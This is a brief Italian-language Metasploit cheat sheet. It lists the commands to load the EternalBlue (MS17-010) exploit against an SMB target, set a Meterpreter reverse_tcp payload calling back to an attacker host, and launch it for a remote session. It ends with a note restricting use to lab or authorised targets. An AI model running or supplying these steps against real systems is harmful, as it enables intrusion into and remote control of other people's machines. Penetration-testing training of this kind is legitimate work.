# Metasploit Framework - exploitation

## Avvio
```
msfconsole
```
Flusso tipico:
```
search ms17-010                 # cerca un exploit
use exploit/windows/smb/ms17_010_eternalblue
show options                    # parametri richiesti
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit                         # lancia
```
Dopo l'accesso ottieni una sessione "meterpreter".

## Legale
Solo su target di laboratorio (es. Metasploitable) o autorizzati.
